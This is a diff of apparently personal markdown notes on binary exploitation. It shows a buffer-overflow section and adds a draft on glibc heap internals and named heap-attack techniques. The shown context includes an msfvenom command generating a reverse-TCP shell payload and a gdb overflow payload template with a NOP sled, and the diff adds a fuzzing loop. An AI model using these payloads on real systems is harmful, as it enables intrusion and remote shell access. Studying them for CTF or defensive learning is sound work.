@@ -21,10 +21,86 @@ msfvenom -p linux/x86/shell_reverse_tcp lhost=<LHOST> lport=<LPORT> --format c -
 (gdb) run $(python -c 'print "\x55" * (offset_len - NOP_len - shellcode_len) + "\x90" * NOP_len + "shellcode" + "return address in little endian"')
 ```
 
+`for i in $(cat len.txt); do ./bin $(python -c "print('A' * $i)"); done`
+
 ___
 
 **Data Execution Prevention** (`DEP`) is a security feature available in Windows XP, and later with Service Pack 2 (SP2) and above, programs are monitored during execution to ensure that they access memory areas cleanly. DEP terminates the program if a program attempts to call or access the program code in an unauthorized manner.
 
 ___
 
-for i in $(cat len.txt); do ./bin $(python -c "print('A' * $i)"); done
+## Heap exploitation draft
+
+First documented heap exploit around the 2000s:
+
+- <http://phrack.org/issues/66/6.html>
+
+### Intro
+
+#### GLIBC
+
+**GLIBC**, often shortened to **libc**, stands for Gnu C Library (open source)
+    + shared object _(linux equivalent to Windows **DLL** ?)_
+
+> Alternative C library implementations exist such as `musl` or `uclibc`
+
+On an average Linux distro, is it possible to find a process that doesn't map a GLIBC shared object into memory.
+
+Command | Description                                                          |
+--------|----------------------------------------------------------------------|
+`ldd`   | list dynamic dependencies (shared objects) that a binary relies upon |
+
+`*.so` &rarr; shared objects
+
+> ABI versioning convention = **soname**. Increment over the years
+
+Generally linux operating systems are distributed with a specific version of GLI which will not change for the support period.
+
+**Tip**: we can run libc.so to figure out which version is used and what version of `gcc` it was compiled with:
+
+```console
+amirr0r@os:~/notes$ /lib/x86_64-linux-gnu/libc.so.6 
+GNU C Library (Ubuntu GLIBC 2.32-0ubuntu3) release release version 2.32.
+Copyright (C) 2020 Free Software Foundation, Inc.
+This is free software; see the source for copying conditions.
+There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
+PARTICULAR PURPOSE.
+Compiled by GNU CC version 10.2.0.
+libc ABIs: UNIQUE IFUNC ABSOLUTE
+For bug reporting instructions, please see:
+<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.
+```
+
+#### `malloc()`
+
+`malloc()` is a dynamic memory allocator function included in the **GLIBC**.
+
+He distributes "**chunks**" of the heap (pieces from memory).
+
+> `C++` **wrappers**: `new()`, `delete()`, `make_shared()`, `make_unique()`.
+
+Basic operations like starting a new thread, opening a file, dealing with I/O rely on `malloc()` under the hood.
+
+Unlike programming langages such as `Rust`, memory corruption is still an issue for `C`/`C++`... 
+
+> This type of vulnerability can lead to info leak, denial of service or even arbitrary code execution. 
+
+[**LiveOverflow**: what does `malloc()` do?](https://www.youtube.com/watch?v=HPDBOhiKaD8&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=26)
+
+___
+
+### Exploitation techniques
+
+#### House of Force
+#### House of Orange
+#### House of Spirit
+#### House of Lore
+#### House of Einherjar
+#### House of Rabbit
+#### Poison Null Byte
+#### House of Corrosion
+#### Fastbin Dup
+#### Unsafe Unlink
+#### Safe Unlink
+#### Unsortedbin Attack
+#### Tcache Dup
